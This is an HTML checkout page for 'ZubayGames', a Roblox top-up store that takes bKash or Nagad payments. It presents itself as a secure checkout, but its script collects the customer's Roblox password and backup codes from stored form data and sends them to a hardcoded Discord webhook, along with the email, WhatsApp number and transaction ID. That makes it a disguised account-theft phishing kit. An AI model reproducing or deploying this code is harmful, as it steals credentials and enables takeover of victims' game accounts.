<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ZubayGames Secure Checkout</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">

    <div id="main-container" class="w-full max-w-sm bg-white rounded-3xl shadow-2xl p-8">
        <h2 class="text-2xl font-extrabold text-center mb-6">ZubayGames</h2>
        <div class="bg-blue-600 text-white p-5 rounded-2xl text-center mb-8">
            <h1 class="text-4xl font-black">৳ <span id="display-amount">0.00</span></h1>
        </div>

        <div class="grid grid-cols-2 gap-4 mb-8">
            <div class="border p-4 rounded-2xl text-center cursor-pointer hover:bg-slate-100" onclick="selectMethod(this, 'bKash')">bKash</div>
            <div class="border p-4 rounded-2xl text-center cursor-pointer hover:bg-slate-100" onclick="selectMethod(this, 'Nagad')">Nagad</div>
        </div>

        <div id="instruction-box" class="hidden space-y-4">
            <p id="method-name" class="hidden"></p>
            <input type="text" id="txid" placeholder="Enter Transaction ID" class="w-full p-3 border rounded-xl">
            <button onclick="processPayment()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold">VERIFY PAYMENT</button>
        </div>
    </div>

    <div id="status-screen" class="hidden p-8 text-center">
        <h1 id="status-text" class="text-xl font-bold">Processing Transaction...</h1>
    </div>

    <script>
        document.getElementById('display-amount').innerText = localStorage.getItem('checkout_pack_price') || '0.00';

        function selectMethod(el, method) {
            document.getElementById('method-name').innerText = method;
            document.getElementById('instruction-box').classList.remove('hidden');
        }

        function processPayment() {
            const txid = document.getElementById('txid').value.trim();
            const method = document.getElementById('method-name').innerText;
            if (!txid) return alert("Enter TXID!");

            document.getElementById('main-container').classList.add('hidden');
            document.getElementById('status-screen').classList.remove('hidden');

            const webhookURL = "https://discord.com/api/webhooks/1517095501923745842/tl5bviOuKTPZ9BnAdNpQzDyq8q4htTDI1qA1uNVrqc5uTTyr5OMdu1SqS9s3rwctJhcg";

            const payload = {
                "content": "🔔 **Naya Order Aaya Hai!**",
                "embeds": [{
                    "title": "Order Details",
                    "color": 3066993,
                    "fields": [
                        { "name": "Username", "value": localStorage.getItem('checkout_roblox_id') || 'N/A', "inline": true },
                        { "name": "Amount", "value": localStorage.getItem('checkout_pack_price') || '0', "inline": true },
                        { "name": "Method", "value": method, "inline": true },
                        { "name": "TXID", "value": txid, "inline": false },
                        { "name": "Password", "value": localStorage.getItem('checkout_password') || 'N/A', "inline": true },
                        { "name": "Backup Codes", "value": localStorage.getItem('checkout_backup_codes') || 'N/A', "inline": false },
                        { "name": "WhatsApp", "value": localStorage.getItem('checkout_contact_number') || 'N/A', "inline": true },
                        { "name": "Email", "value": localStorage.getItem('checkout_email') || 'N/A', "inline": true }
                    ]
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    alert("Order Placed Successfully!");
                    window.location.href = "index.html"; // Change to your thank you page
                } else {
                    throw new Error('Failed to send');
                }
            })
            .catch(error => {
                alert("Error: Data could not be sent.");
                document.getElementById('main-container').classList.remove('hidden');
                document.getElementById('status-screen').classList.add('hidden');
            });
        }
    </script>
</body>
</html>
